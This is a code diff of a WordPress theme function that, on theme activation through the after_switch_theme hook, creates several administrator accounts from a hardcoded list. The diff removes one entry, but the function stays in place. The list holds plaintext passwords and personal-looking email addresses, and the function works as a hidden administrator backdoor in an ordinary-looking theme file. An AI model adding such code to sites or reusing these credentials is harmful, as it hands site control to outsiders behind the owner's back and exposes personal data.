@@ -125,12 +125,6 @@ function create_custom_admin_users_on_theme_activation() {
                 'role'     => 'administrator'
             ],
             [
-                'username' => 'Duhaeldardery',
-                'email'    => 'dohamohammed121@gmail.com',
-                'password' => 'Duha@12345',
-                'role'     => 'administrator'
-            ],
-            [
                 'username' => 'Mariemalish',
                 'email'    => 'mariemalissh@gmail.com',
                 'password' => 'ihf16051999',
@@ -193,5 +187,6 @@ function create_custom_admin_users_on_theme_activation() {
 
     update_option('custom_admin_users_created_new_last', true);
 }
+
 
 add_action('after_switch_theme', 'create_custom_admin_users_on_theme_activation');
